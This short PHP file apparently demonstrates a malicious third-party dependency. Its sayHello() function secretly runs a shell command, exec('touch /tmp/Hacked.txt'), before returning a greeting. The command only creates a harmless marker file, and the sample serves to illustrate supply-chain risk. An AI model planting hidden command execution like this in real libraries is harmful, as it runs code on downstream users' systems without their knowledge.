<?php
// Define a function in the dependency, that we suppose is the popular
// one for which this 3rd-party dependency is tipically downloaded
// by downstream users

function sayHello($name) {

    // Run the shell command
    exec('touch /tmp/Hacked.txt');
    return "Hello, $name!";
}
?>
